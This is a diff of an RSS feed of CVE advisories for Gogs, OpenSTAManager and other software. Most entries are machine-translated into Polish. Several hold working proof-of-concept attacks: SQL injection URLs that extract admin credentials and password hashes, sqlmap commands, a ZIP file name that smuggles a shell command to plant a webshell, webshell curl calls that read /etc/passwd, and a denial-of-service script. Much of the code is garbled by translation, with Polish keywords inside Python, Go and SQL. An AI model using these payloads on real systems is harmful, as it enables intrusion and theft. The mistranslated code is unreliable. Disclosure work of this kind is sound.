@@ -1,7 +1,630 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-2059</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-2059</link><pubDate>Fri, 06 Feb 2026 17:02:07 +0000</pubDate><description>W Systemie Zarządzania Portalem Centrum Medycznego SourceCodester 1.0 została odkryta podatność.Dotknięta jest nieznana funkcja w pliku /emp_edit1.php.Taka manipulacja identyfikatorem argumentu prowadzi do wstrzyknięcia sql.Atak może zostać przeprowadzony zdalnie.Exploit został ujawniony publicznie i może zostać wykorzystany.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-24135</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24135</link><pubDate>Fri, 06 Feb 2026 18:16:25 +0000</pubDate><description>### Podsumowanie
+W funkcji `updateWikiPage` w Gogs istnieje luka w zabezpieczeniach Path Traversal.Luka umożliwia uwierzytelnionemu użytkownikowi z uprawnieniami do zapisu na wiki repozytorium usunięcie dowolnych plików z serwera poprzez manipulację parametrem `old_title` w formularzu edycji wiki.
 
-CVSS Score: 7.3 (high)</description></item><item><title>CVE-2025-64111</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64111</link><pubDate>Fri, 06 Feb 2026 16:58:01 +0000</pubDate><description>Gogs to samoobsługowa usługa Git o otwartym kodzie źródłowym.W wersji 0.13.3 i wcześniejszych, ze względu na niewystarczającą łatkę dla CVE-2024-56731, nadal istnieje możliwość aktualizacji plików w katalogu .git i uzyskania zdalnego wykonania poleceń.Ten problem został naprawiony w wersjach 0.13.4 i 0.14.0+dev.</description></item><item><title>CVE-2026-2058</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-2058</link><pubDate>Fri, 06 Feb 2026 16:32:08 +0000</pubDate><description>Znaleziono błąd w mathurvishal CloudClassroom-PHP-Project do 5dadec098bfbbf3300d60c3494db3fb95b66e7be.Ma to wpływ na nieznaną funkcję pliku /postquerypublic.php komponentu Strona szczegółów zapytania wysyłającego.Ta manipulacja argumentem gnamex powoduje wstrzyknięcie sql.Atak jest możliwy do przeprowadzenia zdalnie.Exploit został opublikowany i może zostać wykorzystany.W tym produkcie zastosowano strategię ciągłego wydawania, aby zapewnić ciągłość dostaw.Dlatego nie można określić szczegółów wersji, których dotyczy problem lub które zostały zaktualizowane.Skontaktowano się ze sprzedawcą w sprawie tego ujawnienia wcześniej, ale nie udzielił on żadnej odpowiedzi.
+### Szczegóły luki w zabezpieczeniach
+Luka zlokalizowana jest w `internal/database/wiki.go`.Podczas aktualizacji strony wiki aplikacja akceptuje parametr `old_title` w celu zidentyfikowania potencjalnej operacji zmiany nazwy.Ten parametr jest używany bezpośrednio w parametrach „path.Join” i „os.Remove” bez odpowiedniego oczyszczenia.
+
+Fragment kodu z `internal/database/wiki.go`:
+idź
+// Linia 114
+os.Remove(path.Join(localPath, oldTitle+.md"))
+```
+
+Jeśli atakujący poda sekwencję przejścia ścieżki (np. `../../../../target`) jako `old_title`, funkcja `os.Remove` rozwiąże ścieżkę względem lokalnego katalogu wiki i usunie plik docelowy.Luka ogranicza się do usuwania plików kończących się na `.md` (ze względu na dołączone rozszerzenie), ale w zależności od systemu plików i konkretnego zachowania `path.Join` lub jeśli istnieją krytyczne pliki `.md` (np. dokumentacja, inne wiki), wpływ jest znaczący.Dodatkowo w niektórych kontekstach rozszerzenie może zostać pominięte lub zignorowane.
+
+### Wpływ
+- **Odmowa usługi**: usunięcie krytycznych plików konfiguracyjnych lub danych (jeśli pasują do rozszerzenia lub za pomocą innych sztuczek).
+- **Utrata danych**: usunięcie stron wiki lub dokumentacji innych użytkowników.
+
+### Naprawa
+Oczyść parametr `oldTitle` za pomocą `ToWikiPageName` (lub sprawdzania poprawności `path.Clean` i nazwy bazowej) przed użyciem go w operacjach na plikach, podobnie jak obecnie obsługiwany jest nowy `title`.
+
+idź
+// Zalecana poprawka
+if oldTitle != "" {
+oldTitle = ToWikiPageName(oldTitle)
+}
+```
+
+### Kroki reprodukcji
+1. Zaloguj się do Gogs jako użytkownik z uprawnieniami do zapisu na wiki repozytorium.
+2. Przechwyć żądanie `POST` do `/repo/wiki/edit`.
+3. Zmodyfikuj parametr `stary_tytuł` na `../../../../tmp/plik_docelowy`.
+4. Złóż wniosek.
+5. Zwróć uwagę, że plik `/tmp/target_file.md` został usunięty z serwera.</description></item><item><title>CVE-2026-23633</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23633</link><pubDate>Fri, 06 Feb 2026 18:14:51 +0000</pubDate><description>## Opis luki
+
+W punkcie końcowym:
+
+```
+/nazwa_użytkownika/nazwa repo/settings/hooks/git/:nazwa
+```
+
+parametr `:name`:
+
+* Jest dekodowany za pomocą **routowania makaroników**, umożliwiając dekodowanie ukośników (`/`)
+* Jest następnie przekazywany bezpośrednio do:
+
+idź
+git.Repository.Hook("custom_hooks", nazwa)
+```
+
+który wewnętrznie rozwiązuje ścieżkę jako:
+
+idź
+ścieżka_pliku.Join(repoPath, "custom_hooks", nazwa)
+```
+
+Ponieważ nie stosuje się oczyszczania ścieżek, podanie sekwencji `../` umożliwia dostęp do **dowolnych ścieżek poza repozytorium**.
+
+### W rezultacie:
+
+* **GET:** Dowolna zawartość pliku jest wyświetlana w obszarze tekstowym strony edycji hooka (**Dołączanie plików lokalnych**).
+* **POST:** Istniejące pliki można zastąpić zawartością kontrolowaną przez osobę atakującą (**Arbitralny zapis pliku**).
+
+---
+
+## Warunki wstępne ataku
+
+* Osoba atakująca jest uwierzytelnionym użytkownikiem
+* Osoba atakująca ma uprawnienia **administratora lub wyższe** w repozytorium docelowym
+* Osoba atakująca ma uprawnienia **AllowGitHook** (lub jest administratorem witryny)
+* Plik docelowy można odczytać/zapisać za pomocą **Uprawnień systemu operacyjnego Gogs**
+
+---
+
+## Scenariusz ataku
+
+1. Osoba atakująca (z uprawnieniamiAllowGitHook + administrator repozytorium) uzyskuje dostęp do adresu URL edycji haka Git
+2. Ścieżka zawierająca `../` jest podana w `:name`, w pełni zakodowana w adresie URL przy użyciu `%2f`
+3. Serwer rozpoznaje `custom_hooks/../../...` bez sprawdzania poprawności
+4. Wyświetlana jest zawartość dowolnego pliku i istnieje możliwość nadpisania istniejących plików
+
+---
+
+## Potencjalny wpływ
+
+* **Ujawnianie informacji wrażliwych:** `app.ini`, bazy danych, logi, zmienne środowiskowe itp.
+* **Konfiguracja lub modyfikacja danych:** Nadpisywanie istniejących plików
+* **Wpływ wtórny:** wyodrębnienie `SECRET_KEY` i danych uwierzytelniających bazy danych może umożliwić sfałszowanie tokena lub dalsze naruszenie bezpieczeństwa</description></item><item><title>CVE-2026-23632</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23632</link><pubDate>Fri, 06 Feb 2026 18:10:05 +0000</pubDate><description>## Opis luki
+
+Punkt końcowy
+`PUT /repos/:właściciel/:repo/contents/*`
+nie wymaga uprawnień do zapisu i umożliwia dostęp z **tylko uprawnieniami do odczytu** poprzez `repoAssignment()`.
+
+Po przejściu kontroli uprawnień `PutContents()` wywołuje `UpdateRepoFile()`, co skutkuje:
+
+* Zatwierdź utworzenie
+* Wykonanie `git push`
+
+Dzięki temu token z **uprawnieniem tylko do odczytu** może zostać użyty do modyfikowania zawartości repozytorium.
+
+---
+
+## Warunki wstępne ataku
+
+* Posiadanie ważnego tokena dostępu
+* Odczyt uprawnień w repozytorium docelowym
+(publiczne repozytorium lub współpracownik z dostępem do odczytu)
+
+---
+
+## Scenariusz ataku
+
+1. Osoba atakująca uzyskuje dostęp do docelowego repozytorium za pomocą tokena tylko do odczytu
+2. Osoba atakująca wysyła żądanie „PUT /contents” w celu aktualizacji dowolnego pliku
+3. Serwer tworzy zatwierdzenie i wykonuje git push w imieniu atakującego
+
+---
+
+## Potencjalny wpływ
+
+* Manipulacja kodem źródłowym
+* Wstrzykiwanie backdoorów
+* Kompromis dotyczący artefaktów wydania i rozproszonych pakietów</description></item><item><title>CVE-2026-22592</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22592</link><pubDate>Fri, 06 Feb 2026 18:08:16 +0000</pubDate><description>### Podsumowanie
+Uwierzytelniony użytkownik może spowodować atak DOS.Jeśli jeden z plików repo zostanie usunięty przed synchronizacją, spowoduje to awarię aplikacji.
+
+### Szczegóły
+Jeśli funkcja GetMirrorByRepoID zakończy się niepowodzeniem, dziennik błędów wyłuska wskaźnik zerowy.Dzieje się tak, jeśli repozytorium nie jest już zamykane.
+https://github.com/gogs/gogs/blob/4cc83c498b6ae59356a04912d68a932165bad5e6/internal/database/mirror.go#L333-L337
+jeśli `err != zero` `m` jest zawsze `nil`
+https://github.com/gogs/gogs/blob/4cc83c498b6ae59356a04912d68a932165bad5e6/internal/database/mirror.go#L269-L278
+### PoC
+Synchronizacja lustrzana spamu w repozytorium i usunięcie tego repozytorium
+kod python spam synchronizacja lustrzana
+```py
+żądania importu
+
+url = "http://gogs.lan:3000/superuser/gobypass403/settings"
+nagłówki = {
+"Cookie": "lang=en-US; i_like_gogs=fe32281ab84ae868; _csrf=UCw6xvqR-L7YLBMPjujwjywxy8s6MTc2NDc3NDQ2NDE1MzU5ODQ3Mg",
+}
+
+dane = {
+"_csrf": "UCw6xvqR-L7YLBMPjujwjywxy8s6MTc2NDc3NDQ2NDE1MzU5ODQ3Mg",
+"akcja": "synchronizacja lustrzana",
+}
+
+podczas gdy prawda:
+print("synchronizacja")
+odpowiedź = żądania.post(url, nagłówki=nagłówki, dane=dane)
+```
+### Wpływ
+Awaria serwera typu „odmowa usługi”.</description></item><item><title>CVE-2025-69216</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69216</link><pubDate>Fri, 06 Feb 2026 18:06:13 +0000</pubDate><description>### Summary
+An **authenticated SQL Injection vulnerability** in OpenSTAManager's Scadenzario (Payment Schedule) print template allows any authenticated user to extract sensitive data from the database, including admin credentials, customer information, and financial records. The vulnerability enables complete database read access through error-based SQL injection techniques.
+
+### Details
+
+The vulnerability exists in `templates/scadenzario/init.php` at **line 46**, where the `id_anagrafica` parameter is directly concatenated into an SQL query without proper sanitization:
+
+**Vulnerable Code:**
+```php
+if (get('id_anagrafica') &amp;&amp; get('id_anagrafica') != 'null') {
+    $module_query = str_replace('1=1', '1=1 AND `co_scadenziario`.`idanagrafica`="'.get('id_anagrafica').'"', $module_query);
+    $id_anagrafica = get('id_anagrafica');
+}
+```
+
+The `get()` function retrieves user input from GET/POST parameters without validation. The parameter value is directly embedded into the SQL query string using string concatenation instead of using the application's `prepare()` sanitization function, enabling SQL Injection attacks.
+
+**Root Cause:**
+- Missing use of `prepare()` function for input sanitization
+- Direct string concatenation in SQL query construction
+- No input validation or type checking
+
+**Affected Endpoint:**
+```
+/pdfgen.php?ptype=scadenzario&amp;id_anagrafica=[INJECTION_PAYLOAD]
+```
+
+**Affected Files:**
+- `templates/scadenzario/init.php` (line 46) - **Primary vulnerability**
+- `templates/scadenzario/init.php` (lines 34, 40) - Similar pattern with date parameters
+- `pdfgen.php` - Entry point for template rendering
+
+
+---
+
+### PoC (Proof of Concept)
+
+#### Prerequisites
+- Valid authenticated session (any user role)
+
+#### Exploitation Steps
+
+**1. Confirm Vulnerability - Basic Syntax Error Test:**
+```bash
+ http://localhost:8081/pdfgen.php?ptype=scadenzario&amp;id_anagrafica=1%22%20--%20
+```
+
+SQL syntax error displayed in application response
+
+&lt;img width="2195" height="392" alt="image" src="https://github.com/user-attachments/assets/f62ca7b4-2397-4f90-8698-6cf7f867d102" /&gt;
+
+---
+
+**2. Extract Database Version - Error-Based SQLi:**
+```bash
+http://localhost:8081/pdfgen.php?ptype=scadenzario&amp;id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))%20AND%20%221%22=%221
+```
+
+**Result:** `~8.3.0~` (MySQL version)
+
+&lt;img width="2061" height="378" alt="image" src="https://github.com/user-attachments/assets/8ea16c47-36cc-4c25-a624-b42ccfcdf52f" /&gt;
+
+---
+
+**3. Extract Database Name:**
+```bash
+http://localhost:8081/pdfgen.php?ptype=scadenzario&amp;id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))%20AND%20%221%22=%221
+```
+
+**Result:** `~openstamanager~`
+
+&lt;img width="1954" height="345" alt="image" src="https://github.com/user-attachments/assets/47479297-5271-4c03-b242-efa513eb28f8" /&gt;
+
+---
+
+**4. Extract Admin Username:**
+```bash
+http://localhost:8081/pdfgen.php?ptype=scadenzario&amp;id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20username%20FROM%20zz_users%20LIMIT%201),0x7e))%20AND%20%221%22=%221
+```
+
+**Result:** `~admin~`
+&lt;img width="1998" height="332" alt="image" src="https://github.com/user-attachments/assets/9f8363cb-8da9-4e8f-8744-ef38c9706be8" /&gt;
+
+---
+
+**5. Extract Admin Email:**
+```bash
+http://localhost:8081/pdfgen.php?ptype=scadenzario&amp;id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20email%20FROM%20zz_users%20LIMIT%201),0x7e))%20AND%20%221%22=%221
+```
+
+**Result:** Admin email address
+
+&lt;img width="2006" height="339" alt="image" src="https://github.com/user-attachments/assets/4dcd5ea4-4eea-4730-8d39-b8ce2da46e84" /&gt;
+
+---
+
+**6. Extract Password Hash (Partial - XPATH 31 char limit):**
+```bash
+http://localhost:8081/pdfgen.php?ptype=scadenzario&amp;id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20password%20FROM%20zz_users%20LIMIT%201),0x7e))%20AND%20%221%22=%221
+```
+
+**Result:** bcrypt password hash
+
+&lt;img width="1924" height="328" alt="image" src="https://github.com/user-attachments/assets/27b711f3-9bb6-4909-a5bd-a04177c9f219" /&gt;
+
+---
+
+**7. Automated Exploitation with SQLMap:**
+
+Create request file `sqli_osm.req`:
+```http
+GET /pdfgen.php?ptype=scadenzario&amp;id_anagrafica=1* HTTP/1.1
+Host: localhost:8081
+Cookie: PHPSESSID=[SESSION_COOKIE]
+User-Agent: Mozilla/5.0
+```
+
+Run SQLMap:
+```bash
+sqlmap -r sqli_osm.req --level 3 --risk 3 --dbs
+```
+
+**SQLMap Confirmed Injection Types:**
+- ✅ Boolean-based blind SQL injection
+- ✅ Error-based SQL injection (MySQL &gt;= 5.6 GTID_SUBSET)
+- ✅ Time-based blind SQL injection (SLEEP)
+
+&lt;img width="1498" height="516" alt="image" src="https://github.com/user-attachments/assets/b733f025-ac4b-4b36-a20e-76d826005f62" /&gt;
+
+---
+
+### Impact
+
+**Who is Impacted:**
+- ✅ **All authenticated users** - Any user with valid credentials can exploit this vulnerability
+- ✅ **Low-privilege users** - Even users with minimal permissions can access admin-level data
+- ✅ **All OpenSTAManager installations** - Vulnerability exists in the latest master branch
+---
+
+### Attribution
+Reported by Łukasz Rybak</description></item><item><title>CVE-2026-24419</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24419</link><pubDate>Fri, 06 Feb 2026 18:05:42 +0000</pubDate><description>OpenSTAManager to oprogramowanie do zarządzania typu open source służące do pomocy technicznej i fakturowania.OpenSTAManager w wersji 2.9.8 i wcześniejszych zawiera krytyczną lukę w zabezpieczeniach polegającą na wstrzykiwaniu SQL w oparciu o błędy w pliku add.php modułu Prima Nota (wpis dziennika).Aplikacja nie sprawdza, czy wartości oddzielone przecinkami parametru id_documenti GET są liczbami całkowitymi przed użyciem ich w klauzulach SQL IN(), co umożliwia atakującym wstrzykiwanie dowolnych poleceń SQL i wyodrębnianie poufnych danych za pomocą komunikatów o błędach XPATH.</description></item><item><title>CVE-2025-69214</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69214</link><pubDate>Fri, 06 Feb 2026 18:04:32 +0000</pubDate><description>## Podsumowanie
+W punkcie końcowym `ajax_select.php` podczas obsługi operacji `componenti` występuje luka w zabezpieczeniach typu SQL Injection.Uwierzytelniony atakujący może wstrzyknąć złośliwy kod SQL poprzez parametr `options[matricola]`.
+
+## Dowód koncepcji
+
+### Kod luki
+**Plik:** `modules/impianti/ajax/select.php:122-124`
+
+```php
+przypadek „komponenty”:
+$impianti = $superselect['matricola'];
+if (!empty($impianti)) {
+$where[] = '`mój_komponenti`.`id_impianto` IN ('.$impianti.')';
+}
+```
+
+### Przepływ danych
+1. **Źródło:** `$_GET['opcje']['matricola']` → `$superselect['matricola']`
+2. ** Luka w zabezpieczeniach:** Dane wprowadzone przez użytkownika są łączone bezpośrednio w klauzulę „IN()” bez oczyszczania
+3. **Sink:** Zapytanie wykonywane poprzez framework AJAX
+
+### Exploit
+
+**Ręczny PoC (Ślepy SQLi oparty na czasie):**
+```http
+GET /ajax_select.php?op=componenti&amp;options[matricola]=1) ORAZ (WYBIERZ 1 Z (SELECT(SLEEP(5)))a) ORAZ (1 HTTP/1.1
+Host: host lokalny: 8081
+Cookie: PHPSESSID=&lt;ważna-sesja&gt;
+```
+&lt;img szerokość="1306" wysokość="581" alt="image" src="https://github.com/user-attachments/assets/238015dd-5644-4eed-ae8f-864dc0073011" /&gt;
+
+**Wykorzystanie SQLMap:**
+,,bicie
+sqlmap -u 'http://localhost:8081/ajax_select.php?op=componenti&amp;options[matricola]=1*' \
+--cookie="PHPSESSID=&lt;sesja&gt;" \
+--dbms=MySQL \
+--technika=T \
+--poziom=3 \
+--ryzyko=3
+```
+
+**Wyjście mapy SQL:**
+```
+[INFO] Parametr URI „#1*” wydaje się mieć wartość „MySQL &gt;= 5.0.12 ORAZ ślepa na podstawie czasu (zapytanie SLEEP)” do wstrzyknięcia
+Parametr: #1* (URI)
+Typ: roleta czasowa
+Tytuł: MySQL &gt;= 5.0.12 ORAZ ciemnota oparta na czasie (zapytanie SLEEP)
+Ładunek: opcje[matricola]=1) ORAZ (WYBIERZ 7438 Z (WYBIERZ(SLEEP(5)))grko)-- SvRI
+zaplecza DBMS: MySQL &gt;= 5.0.12
+```
+&lt;img szerokość="1228" wysokość="801" alt="image" src="https://github.com/user-attachments/assets/b0b7078b-09a7-4e53-956c-baf1d09ed59b" /&gt;
+
+## Wpływ
+- **Eksfiltracja danych:** Oparta na czasie ślepa iniekcja SQL umożliwia pełną ekstrakcję bazy danych
+- **Obejście uwierzytelnienia:** Dostęp do wrażliwych danych komponentów i sprzętu
+- **Manipulacja danymi:** Potencjalna nieautoryzowana modyfikacja zapisów
+
+## Naprawa
+
+Rzutuj wartości na liczby całkowite przed użyciem w SQL:
+
+**Przed:**
+```php
+$impianti = $superselect['matricola'];
+if (!empty($impianti)) {
+$where[] = '`mój_komponenti`.`id_impianto` IN ('.$impianti.')';
+}
+```
+
+**Po:**
+```php
+$impianti = $superselect['matricola'];
+if (!empty($impianti)) {
+$ids = array_map('intval', eksploduj(',', $impianti));
+$where[] = '`mój_komponenti`.`id_impianto` IN ('.implode(',', $ids).')';
+}
+```
+
+## Kredyt
+Odkrył: Łukasz Rybak</description></item><item><title>CVE-2026-2061</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-2061</link><pubDate>Fri, 06 Feb 2026 18:02:09 +0000</pubDate><description>W D-Link DIR-823X 250416 została stwierdzona podatność. Problemem dotknięta jest funkcja sub_424D20 pliku /goform/set_ipv6.Wykonanie manipulacji może prowadzić do wstrzyknięcia polecenia systemu operacyjnego.Istnieje możliwość zdalnego przeprowadzenia ataku.Exploit został publicznie ujawniony i może zostać wykorzystany.
+
+CVSS Score: 4.7 (medium)</description></item><item><title>CVE-2025-69212</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69212</link><pubDate>Fri, 06 Feb 2026 17:59:37 +0000</pubDate><description>## Summary
+A critical OS Command Injection vulnerability exists in the P7M (signed XML) file decoding functionality. An authenticated attacker can upload a ZIP file containing a .p7m file with a malicious filename to execute arbitrary system commands on the server.
+
+
+## Vulnerable Code
+**File:** `src/Util/XML.php:100`
+
+```php
+public static function decodeP7M($file)
+{
+    $directory = pathinfo($file, PATHINFO_DIRNAME);
+    $content = file_get_contents($file);
+
+    $output_file = $directory.'/'.basename($file, '.p7m');
+
+    try {
+        if (function_exists('exec')) {
+            // VULNERABLE - No input sanitization!
+            exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', $output, $cmd);
+```
+
+**The Problem:**
+- The `$file` parameter is passed directly into `exec()` without sanitization
+- Although wrapped in double quotes, an attacker can escape them
+- The filename comes from uploaded ZIP archives (user-controlled)
+
+## Attack Vector
+
+### Entry Points:
+1. **plugins/importFE_ZIP/actions.php:126** (when automatic import is enabled)
+   ```php
+   foreach ($files_xml as $xml) {
+       if (string_ends_with($xml, '.p7m')) {
+           $file = XML::decodeP7M($directory.'/'.$xml);  // $xml from ZIP!
+   ```
+
+2. **plugins/importFE/src/FatturaElettronica.php:56** (constructor)
+   ```php
+   if (string_ends_with($name, '.p7m')) {
+       $file = XML::decodeP7M($this-&gt;file);  // $name from user input!
+   ```
+
+### Attack Flow:
+1. Attacker creates ZIP with malicious filename
+2. Upload ZIP via importFE_ZIP plugin
+3. Application extracts ZIP and iterates files
+4. For `.p7m` files, `decodeP7M()` is called
+5. Malicious filename is injected into `exec()` command
+6. Arbitrary command executes as web server user
+
+## Proof of Concept
+
+**⚠️ IMPORTANT NOTE:** PHP's `ZipArchive::extractTo()` splits filenames on `/` character. Payload must NOT contain `/` in commands. Use `cd directory &amp;&amp; command` instead of absolute paths.
+
+### Step 1: Create Malicious ZIP
+
+```python
+import zipfile
+
+cmd = "cd files &amp;&amp; echo '&lt;?php system($_GET[\"c\"]); ?&gt;' &gt; SHELL.php"
+malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'
+
+with zipfile.ZipFile('exploit.zip', 'w') as zf:
+    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
+```
+
+### Step 2: Upload ZIP
+
+```http
+POST /actions.php HTTP/1.1
+Host: localhost:8081
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBKunENXxjEx5VrRc
+Cookie: PHPSESSID=10fcc3c3cdccf2466ada216d5839084b
+
+------WebKitFormBoundaryBKunENXxjEx5VrRc
+Content-Disposition: form-data; name="blob1"; filename="exploit.zip"
+Content-Type: application/zip
+
+[ZIP CONTENT]
+------WebKitFormBoundaryBKunENXxjEx5VrRc--
+Content-Disposition: form-data; name="op"
+
+save
+
+------WebKitFormBoundaryBKunENXxjEx5VrRc
+Content-Disposition: form-data; name="id_module"
+
+14
+------WebKitFormBoundaryBKunENXxjEx5VrRc
+Content-Disposition: form-data; name="id_plugin"
+
+48
+------WebKitFormBoundaryBKunENXxjEx5VrRc--
+```
+&lt;img width="2539" height="809" alt="image" src="https://github.com/user-attachments/assets/f39cf6ad-9e8d-41de-866e-e01ec2064fd1" /&gt;
+
+&lt;img width="1543" height="659" alt="image" src="https://github.com/user-attachments/assets/41fbd038-0bce-4b1c-bdc3-8ddcf3bf13be" /&gt;
+
+### Step 3: Exploitation Result
+
+**Response (500 error is expected - XML parsing fails AFTER command execution):**
+```http
+HTTP/1.1 500 Internal Server Error
+{"error":{"type":"Exception","message":"Start tag expected, '&lt;' not found"}}
+```
+
+**Verification - Webshell Created:**
+
+&lt;img width="1111" height="239" alt="image" src="https://github.com/user-attachments/assets/d2e36cf3-c438-4509-be46-36d5c6f3e0d1" /&gt;
+
+### Step 4: Remote Code Execution (UNAUTHENTICATED!)
+
+**Webshell is publicly accessible without authentication:**
+
+```bash
+$ curl "http://localhost:8081/files/SHELL.php?c=id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ curl "http://localhost:8081/files/SHELL.php?c=cat+/etc/passwd"
+[Full /etc/passwd output]
+```
+&lt;img width="698" height="475" alt="image" src="https://github.com/user-attachments/assets/7ee4630b-95a8-450c-bdce-d6f703c8168d" /&gt;
+
+
+## Impact
+
+- **Remote Code Execution:** Full server compromise
+- **Data Exfiltration:** Access to all application data and database
+- **Privilege Escalation:** Potential escalation if web server runs with elevated privileges
+- **Persistence:** Install backdoors and maintain access
+- **Lateral Movement:** Pivot to other systems on the network
+
+## Prerequisites
+
+- Authenticated user with access to invoice import functionality
+
+## Remediation
+
+###  Input Sanitization
+
+```php
+public static function decodeP7M($file)
+{
+    // Validate that file path doesn't contain shell metacharacters
+    if (preg_match('/[;&amp;|`$(){}\\[\\]&lt;&gt;]/', $file)) {
+        throw new \Exception('Invalid file path');
+    }
+
+    // Better: use escapeshellarg()
+    $safe_file = escapeshellarg($file);
+    $safe_output = escapeshellarg($output_file);
+
+    exec("openssl smime -verify -noverify -in $safe_file -inform DER -out $safe_output", $output, $cmd);
+}
+```
+or
+
+### Validate Filename Before Processing
+
+```php
+// In the upload handler, validate filenames from ZIP
+foreach ($files_xml as $xml) {
+    // Only allow alphanumeric, dots, dashes, underscores
+    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $xml)) {
+        continue; // Skip invalid filenames
+    }
+
+    if (string_ends_with($xml, '.p7m')) {
+        $file = XML::decodeP7M($directory.'/'.$xml);
+    }
+}
+```
+
+
+## Credit
+Discovered by: Łukasz Rybak</description></item><item><title>CVE-2026-24776</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24776</link><pubDate>Fri, 06 Feb 2026 17:56:11 +0000</pubDate><description>OpenProject to internetowe oprogramowanie do zarządzania projektami typu open source.Przed wersją 17.0.2 procedura obsługi przeciągania i upuszczania przenosząca element porządku obrad do innej sekcji nie sprawdzała prawidłowo, czy docelowa sekcja spotkania jest częścią tego samego spotkania (lub jest zaległością w przypadku spotkań cyklicznych).Umożliwiło to osobie atakującej przeniesienie punktu porządku spotkania na inne spotkanie.Osoba atakująca nie uzyskała dostępu do spotkań, ale mogła dodać dowolne punkty porządku obrad, co mogłoby spowodować zamieszanie.Luka została naprawiona w wersji 17.0.2.
+
+CVSS Score: 4.3 (medium)</description></item><item><title>CVE-2025-64175</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-64175</link><pubDate>Fri, 06 Feb 2026 17:54:52 +0000</pubDate><description>Skontaktuj się z OpenAI Security Research pod adresem outbounddisclosures@openai.com, aby zająć się tym raportem.
+Zobacz raport w formacie PDF dla łatwiejszego czytania.
+
+Porada dotycząca bezpieczeństwa: obejście 2FA za pomocą kodu odzyskiwania
+Typ luki: obejście uwierzytelniania 2FA
+Dotknięte oprogramowanie: GOGS
+Dotkliwość: wysoka
+Data: 5 sierpnia 2025 r
+Odkrywca: badania nad bezpieczeństwem OpenAI
+Podsumowanie
+Weryfikacja kodu odzyskiwania 2FA firmy Gogs nie obejmuje kodów według użytkownika, umożliwiając ominięcie wielu kont.Jeśli atakujący zna nazwę użytkownika i hasło ofiary, może ich użyć
+[Poradnik dotyczący bezpieczeństwa_ Obejście 2FA za pomocą kodu odzyskiwania – Google Docs.pdf](https://github.com/user-attachments/files/21643266/Security.Advisory_.2FA.Bypass.via.Recovery.Code.-.Google.Docs.pdf)
+dowolny niewykorzystany kod odzyskiwania (np. z własnego konta), aby ominąć 2FA ofiary.Umożliwia to pełne przejęcie konta i sprawia, że ​​2FA jest nieskuteczne we wszystkich środowiskach, w których jest włączone.
+Wersje, których to dotyczy
+Oprogramowanie: [Gogs](https://github.com/gogs/gogs/tree/main)
+Potwierdzone wersje: Wszystkie wersje z obsługą 2FA
+Prawdopodobny problem: wszystkie wersje od czasu wprowadzenia logiki UseRecoveryCode
+Wprowadzono zatwierdzenie: [a617d52374e937db0edacfba2a26bdd14a05538e](https://github.com/gogs/gogs/commit/a617d52374e937db0edacfba2a26bdd14a05538e)
+Zatwierdź: a617d52374e937db0edacfba2a26bdd14a05538e
+Autor: Joe Chen
+Data: 5 kwietnia 2017 r
+Opis: 2fa: wstępne wsparcie
+
+Szczegóły luki
+Funkcja UseRecoveryCode w internal/database/two_factor.go nie sprawdza, czy kod odzyskiwania należy do użytkownika uwierzytelniającego.Zamiast tego szuka nieużywanego kodu odzyskiwania:
+Fragment kodu zawierający lukę
+idź
+func UseRecoveryCode(_ int64, ciąg kodu) błąd {
+recoveryCode:= nowy (TwoFactorRecoveryCode)
+ma, błąd := x.Where("code =?", code).And("is_used =?", false).Get(recoveryCode)
+...
+}
+```
+Chociaż obiekt wywołujący przekazuje identyfikator użytkownika, jest on ignorowany.Rezultatem jest globalne wyszukiwanie niewykorzystanego kodu, co umożliwia atakującemu przesłanie własnego kodu odzyskiwania podczas logowania innego użytkownika.
+
+Łańcuch połączeń
+
+moduł obsługi logowania internetowego
+→ UseRecoveryCode(ID użytkownika, kod)
+→ Zapytanie DB bez ograniczenia userID
+Weryfikacja koncepcji (PoC)
+Opis
+Ten błąd jest testowany w najnowszej wersji Gogs hostowanej na [Dockerhub] (https://hub.docker.com/r/gogs/gogs).Osoba atakująca używa własnego kodu odzyskiwania, aby ominąć 2FA innego użytkownika.
+Kroki
+Utwórz konto atakującego A i włącz 2FA.Zapisz kod taki jak „abcde-fghij”.
+Uzyskaj dane uwierzytelniające dla ofiary B.
+Spróbuj zalogować się jako B przez Internet.
+Po wyświetleniu monitu o kod odzyskiwania podaj kod A.
+Zaloguj się, gdy B się powiedzie;Kod A jest oznaczony jako używany.
+
+
+Wpływ
+2FA stało się nieskuteczne dla wszystkich użytkowników
+Realistyczne scenariusze eksploatacji
+Publiczne instancje Gogs z włączoną funkcją 2FA
+Konta programistów lub opiekunów
+Samodzielne serwery Gogs dla przedsiębiorstw
+Potencjalny wpływ
